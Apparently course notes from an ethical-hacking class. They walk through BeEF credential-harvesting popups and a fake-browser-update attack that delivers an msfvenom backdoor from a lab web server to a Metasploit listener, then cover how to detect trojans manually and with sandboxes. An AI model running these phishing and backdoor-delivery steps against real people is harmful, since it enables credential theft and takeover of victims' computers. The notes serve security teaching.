+### **2. Why this is Dangerous (Bypassing HTTPS/HSTS)**
+
+The instructor highlights a critical security advantage of this method:
+
+* **HTTPS/HSTS:** These are security protocols that ensure you are connected to the real, encrypted `facebook.com`.
+* **The Bypass:** Because you are **not** redirecting the user to a fake server, you aren't fighting these protocols. You are simply injecting a drawing of a login box onto the current page. The browser thinks it's just part of the current website, so no security warnings are triggered.
+
+### **3. The Attack Steps**
+
+1.  **Select the Module:** Inside BeEF, navigate to the **Social Engineering** category and find the credential harvester module (often named "Pretty Theft").
+2.  **Choose the Template:** You can select which brand you want to mimic from a dropdown menu.
+    * *Examples used:* **Facebook**, **YouTube**, LinkedIn, Google, etc.
+3.  **Execute:** Click the button to launch.
+
+### **4. The Victim's Experience**
+
+1.  **The Trigger:** Suddenly, their screen goes dark (greyed out).
+2.  **The Pop-up:** A crisp, official-looking floating box appears in the center with the Facebook (or YouTube) logo.
+3.  **The Action:** The victim types their username (`zaid`) and password (`123456`) and hits "Log In."
+4.  **The Disappearance:** The box usually disappears, returning them to the page, leaving them confused but assuming it worked.
+
+### **5. The Result**
+
+Back on your BeEF control panel:
+* The **Command History** logs the input.
+* You see clear text:
+    * `Username: zaid`
+    * `Password: 123456`
+
+---
+
+### <span style = "color: #569cd6">BeEF - Hacking Windows 10 Using A Fake Update Prompt</span>
+
+Delivering a payload via a Fake Notification Bar
+
+### **The Goal: Escaping the Browser**
+So far, BeEF has given you control over the victim's *browser* (stealing cookies, redirecting pages). But ethical hackers want more—they want control over the *Computer* (System Access).
+
+To do this, we need the victim to download and run the **Backdoor** (the `.exe` file) we created in the earlier lectures. This lecture combines everything you have learned so far into one complete attack chain.
+
+### **1. The Strategy: The "Fake Update"**
+Users are trained to update their software. When a browser says "Plugin Missing" or "Critical Update," users often click "Install" without thinking.
+
+This attack uses BeEF to display a **Fake Notification Bar** at the top of the browser that looks exactly like a legitimate Firefox or Chrome system message.
+
+### **2. The Setup (Pre-requisites)**
+
+Before launching the attack in BeEF, the instructor sets up the "Bomb" that will be delivered:
+
+1.  **The Payload:** He takes the backdoor file created with `msfvenom` (from previous lectures).
+2.  **The Name:** He renames it from `rev_https_8080.exe` to **`update.exe`**. This is crucial for social engineering—users trust an "update," not random filenames.
+3.  **The Location:** He moves this file to his web server folder: `/var/www/html/`.
+    * *Result:* The file is now downloadable at `http://10.20.14.207/update.exe`.
+
+### **3. Configuring the Attack in BeEF**
+
+
+
+In the BeEF control panel, the instructor navigates to **Social Engineering** -> **Fake Notification Bar (Firefox)**.
+
+He configures two main fields:
+1.  **Notification Text:**
+    * *Default:* "An additional plugin is required..."
+    * *Instructor's Tip:* You can change this to be more urgent, like "Critical Security Update - Install Now."
+2.  **Plugin URL (The Payload):**
+    * He pastes the direct link to the backdoor he set up in Step 2: `http://10.20.14.207/update.exe`.
+
+### **4. The Execution Flow**
+
+1.  **The Trap:** The instructor clicks **Execute**.
+2.  **The Victim's View:** A bar appears at the top of their browser. It looks native to the software, not like a pop-up ad.
+3.  **The Click:** The victim clicks "Install Plugin."
+4.  **The Download:** Instead of installing a plugin, the browser downloads `update.exe`.
+5.  **The Execution:** The victim, thinking they are patching their browser, runs the `.exe` file.
+
+### **5. The Catch (Metasploit Listener)**
+
+Just like in the "Backdoor" lectures, the file won't work unless you are listening for it.
+
+* The instructor quickly switches to his terminal where **Metasploit Multi-Handler** is running.
+* **Settings:** He ensures the listener is set to the same IP and Port used when he created the backdoor originally.
+* **Result:** As soon as the victim runs `update.exe`, the terminal shows `Meterpreter session opened`.
+
+### **Summary of the Full Attack Chain**
+
+| Step | Tool Used | Action |
+| :--- | :--- | :--- |
+| **1** | `msfvenom` | Create the backdoor (`update.exe`). |
+| **2** | Apache | Host the file so it can be downloaded. |
+| **3** | BeEF | **Hook** the browser and show the **Fake Notification**. |
+| **4** | Social Engineering | Victim is tricked into clicking and running the file. |
+| **5** | `msfconsole` | Receive the connection and gain full control. |
+
+---
+
+### <span style = "color: #569cd6">Detecting Trojans Manually</span>
+
+### **The Big Picture: Defense vs. Offense**
+Up until now, you have been playing the role of the **Attacker** (creating the Trojan). This lecture flips the script and teaches you how to be the **Defender**.
+
+Since Trojans are designed to trick you visually (using fake icons and spoofed extensions), you cannot trust your eyes. You must trust the operating system's data.
+
+### **1. The "Identity Card" Check (Static Analysis)**
+The simplest way to spot a Trojan is to look past its disguise. A file might *look* like a picture of a car, but does Windows *think* it's a picture?
+
+* **The Trick:** The hacker gives an `.exe` file a JPEG icon.
+* **The Check:** Right-click the file -> Select **Properties**.
+* **The Red Flag:**
+    * **Type of file:** If it says **"Application (.exe)"** but the icon is a picture/PDF, **it is a Trojan.**
+    * Real pictures will say "JPG File" or "PNG File." Real songs will say "MP3 File."
+
+**The "Rename" Test:**
+The instructor mentions that if a file name is using the "Right-to-Left Override" trick (where `gpj.exe` looks like `exe.jpg`), simply renaming the file often breaks the illusion.
+* *Action:* Right-click -> Rename -> Change it to "Test".
+* *Result:* The fancy spoofing characters often get removed or reset, revealing the true `.exe` extension at the end.
+
+### **2. The "Wiretap" Check (Dynamic Analysis)**
+Sometimes, checking the file properties isn't enough. For example, if you download a cracked game or a software installer, you *expect* it to be an `.exe`. In this case, the file type isn't suspicious, but its behavior might be.
+
+To catch these, you need to see who the computer is talking to.
+
+**The Tool: Resource Monitor**
+Windows has a built-in tool that acts like a wiretap for your internet connection.
+1.  **Open:** Search for "Resource Monitor" in Windows.
+2.  **Tab:** Click on the **Network** tab.
+3.  **Section:** Look at **TCP Connections**.
+
+**What to look for:**
+* **Local Port:** This is the door on your computer. (e.g., `8080`, `4444`).
+* **Remote Address:** This is the IP address of the computer yours is talking to.
+* **The Red Flag:** You see a connection to an IP address you don't recognize (like the hacker's IP `10.20.14.203` in the video, or a strange public IP) coming from a process that shouldn't be connecting to the internet or looks suspicious.
+
+### **3. The "Background Check" (Reverse DNS)**
+If you see a strange IP address in Resource Monitor (e.g., `69.63.176.13`), how do you know if it's a hacker or just Facebook?
+
+**The Tool: Reverse DNS Lookup**
+* **Action:** Go to Google and search for "Reverse DNS Lookup."
+* **Input:** Type in the suspicious IP address you found in Resource Monitor.
+* **Result:**
+    * **Safe:** If it returns a domain name like `facebook.com`, `google.com`, or `akamai.net` (content delivery), it is likely legitimate traffic.
+    * **Suspicious:** If it returns nothing, or a generic name from a cloud provider (like "AWS" or "DigitalOcean") for a program that shouldn't be using the cloud, or a residential internet provider name, it could be a hacker controlling your computer.
+
+---
+
+### **The Concept: A Safe Room for Malware**
+
+In the previous lecture, you learned to check a file's "ID Card" (Static Analysis) and watch its "Phone Calls" (Network Monitoring). But what if you are too scared to even run the file on your own computer?
+
+This is where a **Sandbox** comes in.
+* **Definition:** A sandbox is an isolated, controlled environment—think of it as a "bomb disposal room." You throw the file inside, lock the door, and let it explode to see what happens.
+* **Why use it:** As the instructor notes, your custom Trojan passed all Antivirus checks (because its *code* looked clean). However, a Sandbox doesn't care about code; it looks at **Behavior**. If a "picture" tries to change your Windows Registry, the sandbox knows it is malicious.
+
+### **1. The Tool: Hybrid Analysis**
+
+The instructor recommends using online cloud sandboxes (like `hybrid-analysis.com`).
+* **Process:** You simply go to the website, upload the suspicious file, and wait.
+* **Mechanism:** The website spins up a virtual computer, runs your file, records absolutely everything it does, and then destroys the virtual computer.
+
+### **2. The Forensic Report**
+
+After the analysis, you get a detailed report. The instructor highlights several "Red Flags" that will appear even if the file is 100% undetectable by Antivirus:
+
+* **Registry Modification:** "Why is this image file trying to change my system settings?"
+* **Error Suppression:** Malware often tries to hide crash messages to stay invisible.
+* **Windows Sockets (Winsock):** This is the Windows service used for the internet. If a calculator app starts using Winsock, it's suspicious.
+* **Network Traffic (The Smoking Gun):**
+    * The report will list exactly which IP addresses the file tried to contact.
+    * As seen in the lecture, it spots the connection to the hacker's IP on port **8080**.
+    * **Analysis:** You can take this IP and do the "Reverse DNS" check (from the previous lecture) to see if it belongs to a legitimate company or a hacker.
+
+### **3. The Golden Rule of Safety**
+
+The instructor ends with a crucial safety warning for ethical hackers:
+* **Never** test malware on your main, physical computer (Host Machine).
+* **Always** use a **Virtual Machine (VM)** (like VirtualBox or VMware) or an **Online Sandbox**.
+* If the malware contains a "worm" or "ransomware" component, running it on your main laptop could destroy your personal data permanently.
+
+### **Summary of the "Client-Side Attacks" Module**
+
+You have now completed the entire journey of a Client-Side Attack:
+1.  **Creation:** Generating the backdoor with `msfvenom`.
+2.  **Disguise:** Trojanning it inside an image and spoofing the extension.
+3.  **Delivery:** Sending it via spoofed emails or hooking browsers with BeEF.
+4.  **Defense:** detecting these attacks using File Properties, Network Monitoring, and Sandboxing.
+
+### **Next Step**
+You have now mastered how to trick a user into letting you in. The next logical step in learning Ethical Hacking is usually **Post-Exploitation**.
+
+Now that you have that Meterpreter session (the "shell"), what can you actually do?
+* **Privilege Escalation:** How to go from a "User" to "Administrator/System".
+* **Keylogging:** Recording keystrokes to steal Facebook/Bank passwords.
+* **Pivoting:** Using the hacked computer to attack *other* computers on the same network.
